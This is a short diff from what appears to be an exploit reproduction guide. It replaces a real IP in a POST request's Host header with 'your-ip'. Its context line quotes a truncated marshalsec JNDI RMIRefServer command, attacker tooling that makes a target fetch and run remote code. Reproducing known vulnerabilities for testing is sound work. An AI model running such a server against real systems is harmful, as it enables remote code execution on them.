@@ -58,7 +58,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 ```
 POST / HTTP/1.1
-Host: 140.238.34.216:8090
+Host: your-ip:8090
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en
